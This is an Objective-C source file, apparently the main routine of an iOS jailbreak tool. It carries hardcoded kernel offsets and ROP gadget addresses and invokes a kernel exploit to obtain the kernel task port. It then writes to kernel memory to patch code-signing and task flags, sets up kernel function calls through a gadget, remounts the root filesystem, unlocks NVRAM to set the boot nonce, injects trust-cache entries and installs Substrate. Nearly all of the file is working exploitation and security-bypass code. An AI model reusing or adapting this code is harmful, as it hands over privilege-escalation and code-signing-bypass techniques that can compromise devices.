#include <dlfcn.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/stat.h>
#include <mach/mach.h>

#include <archive.h>

#include "common.h"
#include "infoleak.h"
#include "pwn.h"
#include "utils.h"
#include "kmem.h"
#include "root.h"
#include "kcall.h"
#include "cs_blobs.h"
#include "kutils.h"
#include "root_fs.h"
#include "nonce.h"
#include "codesign.h"
#include "remote.h"
#include "ArchiveFile.h"

#include "jailbreak.h"

#define MACH(func)\
    ret = func;\
    if (ret != KERN_SUCCESS)\
    {\
        LOG(#func " (ln.%d) failed: %x (%s)", __LINE__, ret, mach_error_string(ret));\
        goto out;\
    }

#define VAL_CHECK(value)\
    if ((value) == 0x0)\
    {\
        LOG("(ln.%d)failed to find " #value "!", __LINE__);\
        ret = KERN_FAILURE;\
        goto out;\
    }
#if 0
offsets_t offs = (offsets_t){
    #ifdef __LP64__
    .constant = {
        .kernel_image_base = 0xfffffff007004000, // static
    },
    .funcs = {
        .copyin = 0xfffffff00719e88c, // symbol
        .copyout = 0xfffffff00719eab0, // symbol 
        .current_task = 0xfffffff0070e8c0c, // symbol
        .get_bsdtask_info = 0xfffffff0070fe7ec, // symbol 
        .vm_map_wire_external = 0xfffffff007148fe8, // symbol
        .vfs_context_current = 0xfffffff0071f2310, // symbol
        .vnode_lookup = 0xfffffff0071d3f90, // symbol
        .osunserializexml = 0xfffffff0074dd7e4, // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
        .proc_find = 0xfffffff0073ed31c, // symbol
        .proc_rele = 0xfffffff0073ed28c, // symbol 

        .smalloc = 0xfffffff006822cb0,
        .ipc_port_alloc_special = 0xfffffff0070ad1a8,
        .ipc_kobject_set = 0xfffffff0070c3148,
        .ipc_port_make_send = 0xfffffff0070ac924,
    },
    .gadgets = {
        .add_x0_x0_ret = 0xfffffff0063fddbc, // gadget 
    },
    .data = {
        .kernel_task = 0xfffffff0075d1048, // symbol 
        .kern_proc = 0xfffffff0075d10a0, // symbol (kernproc)
        .rootvnode = 0xfffffff0075d1088, // symbol 

        .realhost = 0xfffffff0075d6b98, // _host_priv_self -> adrp addr
        .zone_map = 0xfffffff0075f3e50, // str 'zone_init: kmem_suballoc failed', first qword above 
        .osboolean_true = 0xfffffff007640468, // OSBoolean::withBoolean -> first adrp addr
        .trust_cache = 0xfffffff0076ab828,
    },
    .vtabs = {
        .iosurface_root_userclient = 0xfffffff006e73590, // 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
    },
    .struct_offsets = {
        .is_task_offset = 0x28,
        .task_itk_self = 0xd8,
        .itk_registered = 0x2f0,
        .ipr_size = 0x8, // ipc_port_request->name->size
        .sizeof_task = 0x5c8, // size of entire task struct
        .proc_task = 0x18, // proc->task
        .proc_p_csflags = 0x2a8, // proc->p_csflags (_cs_restricted, first ldr offset)
        .task_t_flags = 0x3a0, // task->t_flags
        .task_all_image_info_addr = 0x3a8, // task->all_image_info_addr (theoretically just +0x8 from t_flags)
        .task_all_image_info_size = 0x3b0,  // task->all_image_info_size
    },
    .iosurface = {
        .create_outsize = 0xbc8,
        .create_surface = 0,
        .set_value = 9,
    },
    #endif
};
#else
offsets_t offs = (offsets_t){
    #ifdef __LP64__
    .constant = {
        .kernel_image_base = 0xfffffff007004000, // static
    },
    .funcs = {
        .copyin = 0xfffffff0071aa804, // symbol
        .copyout = 0xfffffff0071aaa28, // symbol 
        .current_task = 0xfffffff0070f4d80, // symbol
        .get_bsdtask_info = 0xfffffff00710a960, // symbol 
        .vm_map_wire_external = 0xfffffff007154fb8, // symbol
        .vfs_context_current = 0xfffffff0071fe2f0, // symbol
        .vnode_lookup = 0xfffffff0071dff70, // symbol
        .osunserializexml = 0xfffffff0074e8f38, // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
        .proc_find = 0xfffffff0073f8ba4, // symbol
        .proc_rele = 0xfffffff0073f8b14, // symbol 

        .smalloc = 0xfffffff006b1acb0, // isn't used anywhere
        .ipc_port_alloc_special = 0xfffffff0070b9328,
        .ipc_kobject_set = 0xfffffff0070cf2c8,
        .ipc_port_make_send = 0xfffffff0070b8aa4,
    },
    .gadgets = {
        .add_x0_x0_ret = 0xfffffff0073ce75c, // gadget 
    },
    .data = {
        .kernel_task = 0xfffffff0075dd048, // symbol 
        .kern_proc = 0xfffffff0075dd0a0, // symbol (kernproc)
        .rootvnode = 0xfffffff0075dd088, // symbol 

        .realhost = 0xfffffff0075e2b98, // _host_priv_self -> adrp addr
        .zone_map = 0xfffffff0075ffe50, // str 'zone_init: kmem_suballoc failed', first qword above 
        .osboolean_true = 0xfffffff00764c468, // OSBoolean::withBoolean -> first adrp addr (isn't used anywhere tho)
        .trust_cache = 0xfffffff0076b8ee8,
    },
    .vtabs = {
        .iosurface_root_userclient = 0xfffffff006eb8e10, // 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
    },
    .struct_offsets = {
        .is_task_offset = 0x28,
        .task_itk_self = 0xd8,
        .itk_registered = 0x2f0,
        .ipr_size = 0x8, // ipc_port_request->name->size
        .sizeof_task = 0x5c8, // size of entire task struct
        .proc_task = 0x18, // proc->task
        .proc_p_csflags = 0x2a8, // proc->p_csflags (_cs_restricted, first ldr offset)
        .task_t_flags = 0x3a0, // task->t_flags
        .task_all_image_info_addr = 0x3a8, // task->all_image_info_addr (theoretically just +0x8 from t_flags)
        .task_all_image_info_size = 0x3b0,  // task->all_image_info_size
    },
    .iosurface = {
        .create_outsize = 0xbc8,
        .create_surface = 0,
        .set_value = 9,
    },
    #endif
};
#endif


task_t kernel_task;
kptr_t kernel_slide;
kptr_t kernproc;

kern_return_t jailbreak(uint32_t opt)
{
    kern_return_t ret = 0;
    task_t self = mach_task_self();
    kptr_t kbase = 0;
    NSFileManager *fileMgr = [NSFileManager defaultManager];

    if(opt & JBOPT_POST_ONLY)
    {
        ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kernel_task);
        ASSERT_RET_PORT(out, "kernel_task", ret, kernel_task);
        task_dyld_info_data_t info;
        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
        ASSERT_RET(out, "task_info", task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&info, &cnt));
        kbase = info.all_image_info_addr;
		LOG("kbase %llx\n",kbase);
    }
    else
    {
        suspend_all_threads();

        ret = pwn_kernel(offs, &kernel_task, &kbase);

        resume_all_threads();
            
        if(ret != KERN_SUCCESS) goto out;

        LOG("kernel been dun fucked");
    }

    kernel_slide = kbase - offs.constant.kernel_image_base;
	LOG("kslide %llx\n",kernel_slide);

    if (!MACH_PORT_VALID(kernel_task))
    {
        LOG("invalid kernel task");
        goto out;
    }

    LOG("got kernel_task: %x\n", kernel_task);

    kernproc = rk64(offs.data.kern_proc + kernel_slide);
    VAL_CHECK(kernproc);

    LOG("kernproc: %llx\n", kernproc);

    MACH(elevate_to_root());

    MACH(init_kexecute(offs.data.zone_map, offs.gadgets.add_x0_x0_ret));

    kptr_t kexec_test = kexecute(offs.gadgets.add_x0_x0_ret, 1, 0x20);
    VAL_CHECK(kexec_test);

    uint64_t myproc = find_proc(getpid());
    VAL_CHECK(myproc);

    uint64_t mytask = rk64(myproc + offs.struct_offsets.proc_task); // proc->task
    VAL_CHECK(mytask);

    {
        // patch our csflags
        uint32_t csflags = rk32(myproc + offs.struct_offsets.proc_p_csflags); // proc->p_csflags (_cs_restricted, first ldr offset)
        VAL_CHECK(csflags);
        LOG("current csflags: %x", csflags);

        csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
        wk32(myproc + offs.struct_offsets.proc_p_csflags, csflags);
        LOG("updated csflags: %x", csflags);
    }

    {
        // patch t_flags
        // bypasses task_conversion_eval checks 
        uint32_t t_flags = rk32(mytask + offs.struct_offsets.task_t_flags); // task->t_flags
        VAL_CHECK(t_flags);

        LOG("current t_flags: %x", t_flags);
        t_flags |= 0x400; // TF_PLATFORM

        wk32(mytask + offs.struct_offsets.task_t_flags, t_flags);
        LOG("new t_flags: %x", t_flags);
    }

    MACH(remount_root_fs());
    LOG("remounted root fs");

    fclose(fopen("/.cydia_no_stash", "w"));

    {
        // patch nvram
        MACH(unlock_nvram());
        LOG("patched nvram successfully");

        // set generator 
        // TODO: set this to 0x0
        MACH(set_generator("0xcb95ce776496b54f"));

        const char *current_gen = get_generator();
        LOG("generator is set to: %s", current_gen);
        
        if (current_gen)
        {
            free((void *)current_gen);
        }

        // do we want to lock it down again?
        // leaving it unlocked allows ppl to set nonce from shell...
        // MACH(lock_nvram()); 
    }
    
    {
        // set dyld task info for kernel
        // note: this offset is pretty much the t_flags offset +0x8
        uint64_t kernel_task_addr = rk64(offs.data.kernel_task + kernel_slide);
        wk64(kernel_task_addr + offs.struct_offsets.task_all_image_info_addr, kbase);  // task->all_image_info_addr
        wk64(kernel_task_addr + offs.struct_offsets.task_all_image_info_size, kernel_slide); // task->all_image_info_size
    
        struct task_dyld_info dyld_info = {0};
        mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
        ret = task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
        LOG("task_info ret: %x (%s)", ret, mach_error_string(ret));
        
        if (ret == KERN_SUCCESS)
        {
            LOG("all_image_info_addr: %llx", dyld_info.all_image_info_addr);
            LOG("all_image_info_size: %llx", dyld_info.all_image_info_size);
            
            if (dyld_info.all_image_info_addr != kbase)
            {
                LOG("failed to set all_image_info_addr godammit");
            }
            
            if (dyld_info.all_image_info_size != kernel_slide)
            {
                LOG("failed to set all_image_info_size godammit");
            }
        }
    }

    // get bundle path
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesUrl = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char *bundle_path = malloc(len);
    CFURLGetFileSystemRepresentation(resourcesUrl, TRUE, (UInt8 *)bundle_path, len);
    LOG("bundle path: %s", bundle_path);
    
    // TODO: hash checks on binaries 
    #define COPY_RESOURCE(name, to_path)\
    do\
    {\
        unlink(to_path);\
        [fileMgr copyItemAtPath:[NSString stringWithFormat:@"%s/%s", bundle_path, name] toPath:@to_path error:nil];\
        chown(to_path, 0, 0);\
        chmod(to_path, 755);\
    }\
    while (0)

    if (access("/jb", F_OK) != 0)
    {
        MACH(mkdir("/jb", 0755));

        if (access("/jb", F_OK) != 0)
        {
            LOG("failed to create /jb directory!");
            ret = KERN_FAILURE;
            goto out;
        }
    }

    {
        if ((opt & JBOPT_POST_ONLY) == 0)
        {
            if (access("/.spice_bootstrap_installed", F_OK) != 0)
            {
                COPY_RESOURCE("bootstrap.tar.lzma", "/jb/bootstrap.tar.lzma");

                if (access("/jb/bootstrap.tar.lzma", F_OK) != 0)
                {
                    LOG("failed to find the bootstrap file");
                    ret = KERN_FAILURE;
                    goto out;
                }

                LOG("extracting bootstrap...");

                ArchiveFile *tar = [ArchiveFile archiveWithFile:@"/jb/bootstrap.tar.lzma"];
                BOOL extractResult = [tar extractToPath:@"/"];

                if (!extractResult)
                {
                    LOG("failed to extract bootstrap!");
                    ret = KERN_FAILURE;
                    goto out;
                }

                COPY_RESOURCE("jailbreak-resources.deb", "/jb/jailbreak-resources.deb");

                if (access("/jb/jailbreak-resources.deb", F_OK) != 0)
                {
                    LOG("failed to find jailbreak-resources.deb");
                    ret = KERN_FAILURE;
                    goto out;
                }

                extractResult = extractDeb(@"/jb/jailbreak-resources.deb");

                if (!extractResult)
                {
                    LOG("failed to extract jailbreak-resources.deb!");
                    ret = KERN_FAILURE;
                    goto out;
                }

                fclose(fopen("/.spice_bootstrap_installed", "w+"));

                LOG("finished extracting bootstrap");

                {
                    // modify springboard settings plist so cydia shows 

                    ret = execprog("/usr/bin/killall", (const char **)&(const char *[])
                    {
                        "/usr/bin/killall",
                        "-SIGSTOP",
                        "cfprefsd",
                        NULL
                    });
                    if (ret != 0)
                    {
                        LOG("failed to run killall(1): %d", ret);
                        ret = KERN_FAILURE;
                        goto out;
                    }

                    NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
                    [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
                    [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
                    
                    ret = execprog("/usr/bin/killall", (const char **)&(const char *[])
                    {
                        "/usr/bin/killall",
                        "-SIGSTOP",
                        "cfprefsd",
                        NULL
                    });
                    if (ret != KERN_SUCCESS)
                    {
                        LOG("failed to run killall(2): %d", ret);
                        ret = KERN_FAILURE;
                        goto out;
                    }

                    LOG("set SBShowNonDefaultSystemApps");
                }

                {
                    LOG("running uicache (this will take some time)...");

                    ret = execprog("/usr/bin/uicache", NULL);
                    if (ret != 0)
                    {
                        LOG("failed to run uicache!");
                        ret = KERN_FAILURE;
                        goto out;
                    }

                    LOG("done!");
                }
            }
        }
        else if (access("/.spice_bootstrap_installed", F_OK) != 0)
        {
            LOG("big problem! we are in JBOPT_POST_ONLY mode but the bootstrap was not found!");   
            return KERN_FAILURE;
        }
        else 
        {
            LOG("JBOPT_POST_ONLY mode and bootstrap is present, all is well");
        }
    }

    {
        // check if substrate is not installed & install it from a deb file 
        if ((opt & JBOPT_POST_ONLY) == 0)
        {
            if (access("/usr/libexec/substrate", F_OK) != 0)
            {
                LOG("substrate was not found? installing it...");

                COPY_RESOURCE("mobilesubstrate.deb", "/jb/mobilesubstrate.deb");

                if (access("/jb/mobilesubstrate.deb", F_OK) != 0)
                {
                    LOG("tried to install substrate but failed to copy it!");
                    ret = KERN_FAILURE;
                    goto out;
                }

                BOOL extractResult = extractDeb(@"/jb/mobilesubstrate.deb");

                if (!extractResult)
                {
                    LOG("attempted to install substrate but failed to extract it!");
                    ret = KERN_FAILURE;
                    goto out;
                }

                LOG("finished installing substrate");
            }
        }
    }

    {
        // handle substrate's unrestrict library 

        if (access("/Library/MobileSubstrate", F_OK) != 0)
        {
            mkdir("/Library/MobileSubstrate", 0755);
        }
        if (access("/Lbirary/MobileSubstrate/ServerPlugins", F_OK) != 0)
        {
            mkdir("/Library/MobileSubstrate/ServerPlugins", 0755);
        }

        if ((opt & JBOPT_POST_ONLY) == 0)
        {
            if (access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK) == 0)
            {
                unlink("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib");
                LOG("deleted old Unrestrict.dylib");
            }

            COPY_RESOURCE("Unrestrict.dylib", "/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib");
            LOG("unrestrict: %d", access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK));
        }
        else if (access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK) != 0)
        {
            LOG("note: JBOPT_POST_ONLY mode but unrestrict.dylib was not found");
        }
        else
        {
            LOG("JBOPT_POST_ONLY mode and unrestrict is present, all is well");
        }
    }

    {
        NSMutableDictionary *dict = NULL;

        NSData *blob = [NSData dataWithContentsOfFile:@"/jb/offsets.plist"];
        if (blob != NULL)
        {
            dict = [NSPropertyListSerialization propertyListWithData:blob options:NSPropertyListMutableContainers format:nil error:nil];
        }
        else 
        {
            dict = [[NSMutableDictionary alloc] init];
        }
        
        dict[@"AddRetGadget"]       = [NSString stringWithFormat:@"0x%016llx", offs.gadgets.add_x0_x0_ret + kernel_slide];
        dict[@"KernProc"]           = [NSString stringWithFormat:@"0x%016llx", offs.data.kern_proc + kernel_slide];
        dict[@"OSBooleanTrue"]      = [NSString stringWithFormat:@"0x%016llx", rk64(rk64(offs.data.osboolean_true + kernel_slide))];
        dict[@"OSBooleanFalse"]     = [NSString stringWithFormat:@"0x%016llx", rk64(rk64(offs.data.osboolean_true + 0x8 + kernel_slide))];
        dict[@"OSUnserializeXML"]   = [NSString stringWithFormat:@"0x%016llx", offs.funcs.osunserializexml + kernel_slide];
        dict[@"ProcFind"]           = [NSString stringWithFormat:@"0x%016llx", offs.funcs.proc_find + kernel_slide];
        dict[@"ProcRele"]           = [NSString stringWithFormat:@"0x%016llx", offs.funcs.proc_rele + kernel_slide];
        dict[@"Smalloc"]            = [NSString stringWithFormat:@"0x%016llx", offs.funcs.smalloc + kernel_slide];
        dict[@"ZoneMapOffset"]      = [NSString stringWithFormat:@"0x%016llx", offs.data.zone_map + kernel_slide];

        [dict writeToFile:@"/jb/offsets.plist" atomically:YES];
        LOG("wrote offsets.plist");
        
        chown("/jb/offsets.plist", 0, 0);
        chmod("/jb/offsets.plist", 0644);
    }

	{
		if (opt & JBOPT_POST_ONLY) {
			// spawing a bin to get amfid up
			execprog("/bin/bash",NULL);
		}
	}

    {
        if (access("/Library/Substrate", F_OK) == 0)
        {
            // move to old directory
            NSString *newPath = [NSString stringWithFormat:@"/Library/Substrate.%lu", (unsigned long)time(NULL)];
            LOG("moving /Library/Substrate to new path: %@", newPath);

            [fileMgr moveItemAtPath:@"/Library/Substrate" toPath:newPath error:nil];

            if (access("/Library/Substrate", F_OK) == 0)
            {
                LOG("failed to move /Library/Substrate!!");
                ret = KERN_FAILURE;
                goto out;
            }
        }

        mkdir("/Library/Substrate", 1755);

        if (access("/usr/libexec/substrate", F_OK) == 0)
        {
            inject_trust("/usr/libexec/substrate");

            ret = execprog("/usr/libexec/substrate", NULL);
            LOG("substrate ret: %d", ret);
        }
        else if (opt & JBOPT_POST_ONLY)
        {
            LOG("JBOPT_POST_ONLY and substrate was not found! something has gone horribly wrong");
            ret = KERN_FAILURE;
            goto out;
        }
        else 
        {
            LOG("substrate was not found, why was it not installed?!?!");
            ret = KERN_FAILURE;
            goto out;
        }

        /* 
         * if substrate fails to launch we're in trouble
         * we also need to be checking it's installed 
         * before attempting to launch it 
         * -- remember; it handles codesign patching
         */ 
    }

    {
        // TODO: copy/check for launchctl
        MACH(inject_trust("/bin/launchctl"));

        // start launchdaemons
        ret = execprog("/bin/launchctl", (const char **)&(const char *[])
        {
            "/bin/launchctl",
            "load",
            "-w",
            "/Library/LaunchDaemons",
            NULL
        });
        if (ret != 0)
        {
            LOG("failed to start launchdaemons: %d", ret);
        }
        LOG("started launchdaemons: %d", ret);

        // run rc.d scripts
        if (access("/etc/rc.d", F_OK) == 0)
        {
            // "No reason not to use it until it's removed" - sbingner, 12-11-2018
            typedef int (*system_t)(const char *command);
            system_t sys = dlsym(RTLD_DEFAULT, "system");
            
            NSArray *files = [fileMgr contentsOfDirectoryAtPath:@"/etc/rc.d" error:nil];
            
            for (NSString *file in files)
            {
                NSString *fullPath = [NSString stringWithFormat:@"/etc/rc.d/%@", file];

                // ignore substrate
                if ([fullPath isEqualToString:@"/etc/rc.d/substrate"] ||
                    [fullPath isEqualToString:@"/etc/rc.d/substrated"])
                {
                    LOG("ignoring substrate...");
                    continue;
                }

                ret = sys([fullPath UTF8String]);
                
                // poor man's WEIEXITSTATUS
                LOG("ret on %s: %d\n", [fullPath UTF8String], (ret >> 8) & 0xff);
            }
        }
    }

    {
        if ((opt & JBOPT_POST_ONLY) != 0)
        {
            LOG("finished post exploitation");

            LOG("unloading prdaily...");

            ret = execprog("/bin/launchctl", (const char **)&(const char *[])
            {
                "/bin/launchctl",
                "unload",
                "/System/Library/LaunchDaemons/com.apple.prdaily.plist",
                NULL
            });
            if (ret != 0)
            {
                LOG("failed to unload prdaily! ret: %d", ret);
                ret = KERN_FAILURE;
                goto out;
            }

            LOG("prdaily unloaded\n");

            /* hope substrateis running byu this point? */

            if (access("/usr/bin/ldrestart", F_OK) != 0)
            {
                LOG("failed to find ldrestart?!");
                ret = KERN_FAILURE;
                goto out;
            }

            ret = execprog("/usr/bin/ldrestart", NULL);
            if (ret != 0)
            {
                LOG("failed to execute ldrestart: %d", ret);
                ret = KERN_FAILURE;
                goto out;
            }
        }
    }
    
    ret = KERN_SUCCESS;

out:;
    restore_to_mobile();

    term_kexecute();

    if (MACH_PORT_VALID(kernel_task))
    {
        mach_port_deallocate(self, kernel_task);
    }

    return ret;
}
